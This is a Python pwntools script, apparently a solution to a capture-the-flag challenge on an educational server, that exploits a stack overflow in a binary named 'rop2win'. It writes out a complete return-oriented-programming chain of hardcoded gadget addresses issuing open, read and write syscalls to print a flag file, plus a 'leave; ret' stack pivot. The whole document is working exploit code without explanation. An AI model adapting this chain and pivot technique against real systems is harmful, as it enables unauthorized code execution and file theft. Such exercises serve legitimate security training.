from pwn import *

#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10005)
raw_input()
context.arch = 'amd64'

fn = 0x4df460
ROP_addr = 0x4df360

pop_rax_ret = 0x4607e7
pop_rdi_ret = 0x40186a
pop_rsi_ret = 0x4028a8
pop_rdx_rbx_ret = 0x40176f
syscall = 0x42cea4
#ret = 0x40101a
leave_ret = 0x401ebd

ROP = flat(
   # Open filename
   pop_rax_ret, 2,
   pop_rdi_ret, fn,
   pop_rsi_ret, 0,
   syscall,
   

   # Read the file
   pop_rax_ret, 0,
   pop_rdi_ret, 3,
   pop_rsi_ret, fn,
   pop_rdx_rbx_ret, 0x30,
   syscall,
   

   # Write the file
   pop_rax_ret, 1,
   pop_rdi_ret, 1,
   syscall,
   
        )

r.sendafter("Give me filename:", '/home/rop2win/flag\x00')
r.sendafter("Give me ROP:", b'a'*0x8 + ROP)
r.sendafter('Give me overflow:', b'a'*0x20 + p64(ROP_addr) + p64(leave_ret))

r.interactive()
